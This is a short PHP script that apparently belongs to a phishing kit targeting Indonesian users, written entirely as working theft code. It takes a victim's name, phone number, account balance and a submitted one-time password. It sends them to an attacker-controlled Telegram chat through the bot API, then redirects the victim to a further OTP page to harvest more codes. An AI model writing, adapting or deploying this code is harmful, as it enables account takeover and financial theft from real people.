<?php
include 'telegram.php';
session_start();
$f = $_POST['f'];



$a       = $_SESSION['a'];
$b                = $_SESSION['b'];
$c        = $_SESSION['c'];
$d        = $_SESSION['d'];
$e               = $_SESSION['e'];
$message = "
├♧ INFO | BOSSQU | ".$a."
├───────────────────
├♧ Nama : ".$a."
├♧ Nomor : ".$b."
├♧ Saldo : ".$c."
├───────────────────
├♧ OTP : ".$f."
╰───────────────────
";

function sendMessage($telegram_id, $message, $id_bot) {
    $url = "https://api.telegram.org/bot" . $id_bot . "/sendMessage?parse_mode=markdown&chat_id=" . $telegram_id;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}

sendMessage($telegram_id, $message, $id_bot);
header('Location: ../otp2.php');
?>
